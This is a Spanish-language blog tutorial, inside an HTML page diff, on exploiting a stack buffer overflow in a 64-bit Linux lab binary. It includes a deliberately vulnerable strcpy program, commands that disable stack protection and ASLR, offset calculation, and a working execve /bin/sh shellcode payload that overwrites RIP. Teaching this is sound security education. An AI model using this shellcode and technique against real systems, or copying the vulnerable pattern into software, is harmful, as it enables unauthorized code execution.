@@ -1,0 +1,711 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="es" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>BoF stack-based - c4rta</title>
+<meta name="description" content="Aprenderas a como realizar un simple buffer overflow stack-based en linux de 64 bits">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="es_ES">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:title" content="BoF stack-based">
+<meta property="og:url" content="http://localhost:4000/bof-stack-based/">
+
+
+  <meta property="og:description" content="Aprenderas a como realizar un simple buffer overflow stack-based en linux de 64 bits">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-07-28T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/bof-stack-based/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "c4rta",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="c4rta Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categorias/" >Categorias</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">BoF stack-based</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="c4rta" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">c4rta</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        CTF player<br>Apasionado a la ciberseguridad
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="BoF stack-based">
+    <meta itemprop="description" content="Aprenderas a como realizar un simple buffer overflow stack-based en linux de 64 bits">
+    <meta itemprop="datePublished" content="July 28, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">BoF stack-based
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-07-28T00:00:00-05:00">July 28, 2022 </time>&emsp;
+          
+          
+        </p>
+        <h2 id="contenido">Contenido</h2>
+<ul>
+  <li>¿Que es buffer overflow?.</li>
+  <li>Layout del stack.</li>
+  <li>Analisis el codigo fuente del binario</li>
+  <li>Desbordando el buffer.</li>
+  <li>Calculando el offset y tomando el control del RIP.</li>
+  <li>Ejecutando la shellcode.</li>
+</ul>
+
+<h2 id="que-es-buffer-overflow">¿Que es buffer overflow?</h2>
+
+<p>El buffer es un espacio en la memoria en el cual se almacenan datos de manera temporal mientras se transfieren de una ubicacion a otra. El buffer overflow ocurre cuando se supera el espacio que se le fue asignado al buffer, como resultado de esto el programa intenta escribir los datos en el buffer pero lo unico que ocasiona es que se sobreescriban otros registros de la memora</p>
+
+<p><img src="/assets/images/bof-stack-based/buffer-overflow.png.webp" alt="" /></p>
+
+<p>En la imagen se puede observar una parte coloreada de azul en la cual se refiere al buffer de 8 bytes donde cada caracter de la palabra “password” es un byte, por otra parte se tiene una parte coloreada de color salmon/naranja en la cual tiene 2 caracteres (2 bytes) mas de los que puede almacenar el buffer, en la imagen esa parte tiene como nombre “overflow” ya que cuando se le ingresan esos 2 bytes de mas ya se estan saliendo de lo que puede almacenar el buffer y lo que ocurre es un buffer overflow</p>
+
+<p>Imagen: <a href="https://www.imperva.com/">https://www.imperva.com/</a></p>
+
+<h2 id="layout-del-stack">Layout del stack</h2>
+
+<p>El layout del stack en un buffer overflow se estructura de la siguiente manera</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   high memory
+|---------------|
+|    funcion    |
+|---------------|
+|   parametros  |
+|---------------|
+|      RET      | --&gt; Return adress/RIP: contiene la direccion de la siguiente instruccion a ejecutar
+|---------------|
+|      RBP      | --&gt; Base pointer: Puntero base del stack frame actual
+|---------------|     
+|     buffer    |
+|---------------|
+|               |
+|---------------|
+    low memory
+
+RSP: Stack pointer, apunta a la parte superior del stack, RSP contiene la direccion del ultimo valor 
+que se metio en el stack
+</code></pre></div></div>
+
+<h3 id="a-tomar-en-cuenta">A tomar en cuenta</h3>
+<p>Seguramente habras encontrado que los registros como el RBP y RSP pueden tener el nombre de EBP Y ESP, esto es por la arquitectura del sistema, a continuacion te muestro una tabla con los respectivos nombres de los registros en 32 y 64 bits</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>32 bits</th>
+      <th>64 bits</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>EAX</td>
+      <td>RAX</td>
+    </tr>
+    <tr>
+      <td>EBX</td>
+      <td>RBX</td>
+    </tr>
+    <tr>
+      <td>ECX</td>
+      <td>RCX</td>
+    </tr>
+    <tr>
+      <td>EDX</td>
+      <td>RDX</td>
+    </tr>
+    <tr>
+      <td>ESP</td>
+      <td>RSP</td>
+    </tr>
+    <tr>
+      <td>EBP</td>
+      <td>RBP</td>
+    </tr>
+    <tr>
+      <td>EIP</td>
+      <td>RIP</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="analisis-el-codigo-fuente-del-binario">Analisis el codigo fuente del binario</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Input: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>En el siguiente codigo tenemos un buffer de 100 que se esta declarando como <code class="language-plaintext highlighter-rouge">char buf[100]</code> , ademas se esta usando la funcion <code class="language-plaintext highlighter-rouge">strcpy</code> la cual copia el contenido de una cadena a otra, en este caso copia lo que se escriba como argumento a <code class="language-plaintext highlighter-rouge">buf</code> , posteriormente con <code class="language-plaintext highlighter-rouge">printf</code> se imprime el contenido de <code class="language-plaintext highlighter-rouge">buf</code> que seria lo que hayamos ingresado como argumento.</p>
+
+<p>Antes de ejecutar el binario se debe de compilar de la siguiente manera esto para desactivar las protecciones y podamos ejecutar una shellcode:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack vuln.c <span class="nt">-o</span> vuln
+</code></pre></div></div>
+<p>Ahora podemos ver la ejecucion del binario de la siguiente manera:</p>
+
+<p><img src="/assets/images/bof-stack-based/codigo.png" alt="" /></p>
+
+<p>Como se puede ver lo que se ingresa como argumento es lo que se imprime.</p>
+
+<h2 id="desbordando-el-buffer">Desbordando el buffer</h2>
+
+<p>Antes de comenzar con esta parte tenemos que desactivar la aleatoriedad de las direcciones (ASLR) con el siguiente comando:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space
+</code></pre></div></div>
+<p>Si quieres volver a activarlo solo cambia el 0 por un 2.</p>
+
+<p>Ahora si pasaremos a ocasionar el buffer overflow, como sabemos que se esta declarando un buffer de 100, simplemente con unos caracteres de mas lograremos el buffer overflow, para esto usare python y con el siguiente comando generare 150 A.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">"print ('A' * 150)"</span>
+</code></pre></div></div>
+<p>Ahora estos 150 caracteres son los que le pasaremos como argumento a nuestro binario.</p>
+
+<p><img src="/assets/images/bof-stack-based/desborde.png" alt="" /></p>
+
+<p>Y peto, vemos que nos arrojo un <code class="language-plaintext highlighter-rouge">segmentation fault (core dumped)</code>, esto ocurre por que por dentro del binario se esta intentanto acceder a una direccion de la memoria que no es valida, entonces el flujo del programa se corrompe y no tiene mas opcion que petar.</p>
+
+<p>Ahora pasaremos a ver que esta pasando por detras del binario y por que peta, para esto usare gdb con pwndbg, te dejo el repo de pwndbg en el cual vienen los pasos de la instalacion</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/pwndbg/pwndbg.git
+</code></pre></div></div>
+<p>Para comenzar a debuggear el programa con gdb ingresamos este comando</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb -q ./vuln
+</code></pre></div></div>
+
+<p>Para poder ver lo que esta pasando por detras y ver por que nos arrojo el <code class="language-plaintext highlighter-rouge">segmentation fault (core dumped)</code> primero tenemos que ejecutar el binario desde gdb pasandole 150 A con el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r $(python2 -c "print 'A'*150")
+</code></pre></div></div>
+<p>Al ejecutarlo pasandole 150 A vemos que nos arroja esto:</p>
+
+<p><img src="/assets/images/bof-stack-based/gdb-overflow.png" alt="" /></p>
+
+<p>Aqui podemos notar algo diferente a demas del <code class="language-plaintext highlighter-rouge">segmentation fault</code>, abajo de eso vemos el siguiente mansaje <code class="language-plaintext highlighter-rouge">0x0000555555555193 in main ()</code>, esto nos quiere decir que en esa direccion del main() hay algo que es invalido</p>
+
+<p>Bajando un poquito mas de lo que nos muestra el gdb vemos lo siguiente:</p>
+
+<p><img src="/assets/images/bof-stack-based/ret.png" alt="" /></p>
+
+<ul>
+  <li>El RBP se ha sobreescrito por nuestra A</li>
+  <li>El RSP que apunta a la parte superior del stack contiene una direccion con puras A</li>
+  <li>Y el RET/RIP el cual apunta a la siguiente direccion a ejecutar tiene la direccion <code class="language-plaintext highlighter-rouge">0x4141414141414141</code> que en decimal es AAAAAAAA</li>
+</ul>
+
+<p>Y si mostramos el stack frame con el comando <code class="language-plaintext highlighter-rouge">i f</code> , vemos que nuestro <code class="language-plaintext highlighter-rouge">saved rip</code> vale <code class="language-plaintext highlighter-rouge">0x4141414141414141</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rip = 0x555555555193 in main; saved rip = 0x4141414141414141
+</code></pre></div></div>
+
+<h3 id="entonces-por-que-peta">¿Entonces por que peta?</h3>
+
+<p>El programa peta por que cuando se sobreescribe el RIP/RET por <code class="language-plaintext highlighter-rouge">0x4141414141414141</code> , ahora esta apuntando a esa direccion y esa direccion no es valida por que no hay nada que el programa pueda hacer, es por eso que el flujo del programa se corrompe y peta</p>
+
+<p>Y el layout quedo de la siguiente manera</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Ʌ     high memory
+  |  |---------------|
+  |  |    funcion    |
+  |  |---------------|
+  |  |   parametros  |
+  |  |---------------|
+  |--| 414141414141  | --&gt; RIP/RET: 0x4141414141414141
+  |  |---------------|
+  |--| 414141414141  | --&gt; RBP: 0x4141414141414141
+  |  |---------------|     
+  |--| 414141414141  | --&gt; Este es el buffer que se lleno de puras A
+     |---------------|
+     |               |
+     |---------------|
+        low memory
+
+Cuando se sobrepasa el tamaño del buffer nuestras A empiezan a subir a otros registros del stack 
+y a su vez los van sobreescribiendo
+</code></pre></div></div>
+
+<h2 id="calculando-el-offset-y-tomando-el-control-del-rip">Calculando el offset y tomando el control del RIP</h2>
+
+<p>Ahora que ya sabemos que podemos sobreescribir el RIP lo que tenemos que hacer ahora es encontrar el offset del RIP, ya que esto no dice desde donde se empieza a sobreesribir.</p>
+
+<p>Para esto usaremos una utilidad de metasploit que se llama <code class="language-plaintext highlighter-rouge">pattern_create</code> que nos permite generar una serie de caracteres para poder calcular los offset, el comando queda de la siguiente manera:</p>
+
+<p><code class="language-plaintext highlighter-rouge">/opt/metasploit/tools/exploit/pattern_create.rb -l 150</code></p>
+
+<p>En mi caso lo ejecuto asi por que en esa ubicacion tengo la utilidad (se que pwndbg tiene un comando llamado <code class="language-plaintext highlighter-rouge">cyclic</code> para hacer lo mismo, solo que cuando lo uso me peta el pwndbg XD).</p>
+
+<p>Ahora tenemos que correr el programa de esta forma con toda esta cadena que nos genero</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+</code></pre></div></div>
+
+<p>Si vemos nuestro RIP ahora tiene el valor de <code class="language-plaintext highlighter-rouge">0x6541316541306541</code>, esto son unos caracteres que se tomaron de la cadena que se genero.</p>
+
+<p>Ahora con otra utilidad de metasploit llamada <code class="language-plaintext highlighter-rouge">pattern_offset</code> encontraremos el offset del RIP y el comando queda de la siguiente manera</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/metasploit/tools/exploit/pattern_offset.rb -q 0x6541316541306541
+</code></pre></div></div>
+
+<p>Ahi lo tenemos, ahora ya sabemos el offset del RIP</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Exact match at offset 120
+</code></pre></div></div>
+<p>Entonces si ahora que sabemos el offset el RIP podemos controlar a donde queremos apuntar, para saber que tenemos el control del RIP le diremos que el valor que contenga sean puras B, asi que ejecutaremos el programa de esta forma:</p>
+
+<p>Lo que hara es meterle 120 A y como el offset el RIP es 120, las 8 B son con lo que vamos a sobreescribir el RIP</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r $(python2 -c "print 'A'*120 + 'B' * 8")
+</code></pre></div></div>
+
+<p>Y ahi lo tenemos, ahora nuestro RIP tiene el valor <code class="language-plaintext highlighter-rouge">0x4242424242424242</code></p>
+
+<p><img src="/assets/images/bof-stack-based/ret-control.png" alt="" /></p>
+
+<p>Y bueno, ahora que ya podemos controlar el valor del RIP lo que vamos hacer es que el RIP apunte de una direccion arbitraria para para ejecutar una shellcode</p>
+
+<h2 id="ejecutando-la-shellcode">Ejecutando la shellcode</h2>
+
+<h3 id="que-es-una-shellcode">¿Que es una shellcode?</h3>
+
+<p>Una shellcode son instrucciones de bajo nivel que son programadas en lenguaje ensamblador las cuales se inyectan en la memoria, estas intrucciones para poder ser inyectadas se deben de pasar a un string de bytes, la shellcode que usaremos es de 24 bytes y es esta</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
+</code></pre></div></div>
+<p>Lo que hara es ejecutar /bin/sh, aqui les dejo el codigo en asm de esta misma shellcode</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>section .text
+  global _start
+    _start:
+      push rax
+      xor rdx, rdx
+      xor rsi, rsi
+      mov rbx,'/bin//sh'
+      push rbx
+      push rsp
+      pop rdi
+      mov al, 59
+      syscall
+</code></pre></div></div>
+
+<p>Tambien para poder usar una shellcode correctamente tenemos que hacer uso de los NOPs o NOP-slides</p>
+
+<p>Lo que nos permiten los NOPs es deslizar el programa hacia un destino, se interpretan con el valor <code class="language-plaintext highlighter-rouge">\x90</code></p>
+
+<h3 id="ubicando-nuestra-shellcode-en-la-memoria">Ubicando nuestra shellcode en la memoria</h3>
+
+<p>El primer paso que haremos es ubicar nuestra shellcode en la memoria y lo haremos de la siguiente forma</p>
+
+<p>Hay que recodar que tenemos un buffer de 100 que se esta declarando asi <code class="language-plaintext highlighter-rouge">char buf[100]</code></p>
+
+<p>En estos 100 bytes tenemos que lograr ubicar nuestra shellcode de 24 bytes, asi que para eso restaremos 100 - 24 bytes de la shellcode y nos da 76, este 76 sera el junk que llenaremos de NOPs para llenar el buffer de <code class="language-plaintext highlighter-rouge">100</code>, los otros 24 bytes restantes son de la shellcode, hasta ahora nuestro payload va asi:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 76 bytes + 24 bytes = 100 bytes
+|---------|-----------|
+|  junk   | shellcode |
+|---------|-----------|
+</code></pre></div></div>
+
+<p>Tambien le sumaremos 20 NOPs que corresponden al padding, si hacemos una suma de lo que llevamos hasta ahora nos da 120 y nuestro payload va asi:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 76 bytes +  24 bytes + 20 bytes = 120 bytes
+|---------|-----------|---------|
+|  junk   | shellcode | padding |
+|---------|-----------|---------|
+
+</code></pre></div></div>
+<p>Por ultimo le pasaremos 8 bytes mas para sobreescribir el RIP y el payload queda asi:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 76 bytes +  24 bytes + 20 bytes + 8 bytes = 128 bytes
+|---------|-----------|----------|--------|
+|  junk   | shellcode | padding  |  RIP   |
+|---------|-----------|----------|--------|
+
+</code></pre></div></div>
+
+<p>Pasemos a ejecutar el binario en pwndbg de la siguiente manera:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r $(python2 -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'\x90'*20+'B'*8")
+</code></pre></div></div>
+<p>Vemos la misma historia, se ocasiono el <code class="language-plaintext highlighter-rouge">segmentation fault</code> y nuestro RIP vale <code class="language-plaintext highlighter-rouge">0x4242424242424242</code> que son las 8 B que le indicamos.</p>
+
+<p>Para ver si nuestra shellcode esta en la memoria mostraremos 100 bytes del rsp menos 200 con el siguiente comando en gdb:</p>
+
+<p><code class="language-plaintext highlighter-rouge">x/100wx $rsp-200</code></p>
+
+<p>Esto no debe de mostar algo como esto, donde la parte que esta seleccionada es nuestra shellcode, tambien ahi mimso podemos ver los 76 NOPs del junk, los 20 del padding y los 8 del RIP</p>
+
+<p><img src="/assets/images/bof-stack-based/shellcode.png" alt="" /></p>
+
+<p>Por ultimo para poder ejecutar nuestra shellcode tenemos que cambiar esos 8 bytes del RIP a una direccion que este entre todos los NOPs y donde solo haya NOPs, esa direccion la tenemos que pasar a little endian, yo les recomiendo que usen cualquiera de estas, yo use la que esta seleccionada (es probable que las direcciones que les salgan a ustedes sean diferentes a las mias):</p>
+
+<p><img src="/assets/images/bof-stack-based/ret-shellcode.png" alt="" /></p>
+
+<p>El comando para a ejecutar en gdb queda de la siguiente forma:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r $(python2 -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'\x90'*20+'\xe0\xdc\xff\xff\xff\x7f\x00\x00'")
+</code></pre></div></div>
+
+<p>Y listo, ya obtuvimos una shell!!</p>
+
+<p><img src="/assets/images/bof-stack-based/pwn.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+<p><img src="/assets/images/bof-stack-based/waifu.png" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#bof" class="page__taxonomy-item" rel="tag">bof</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwndbg" class="page__taxonomy-item" rel="tag">pwndbg</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categorias/#explotacion-binaria" class="page__taxonomy-item" rel="tag">Explotacion binaria</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-07-28T00:00:00-05:00">July 28, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 c4rta</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
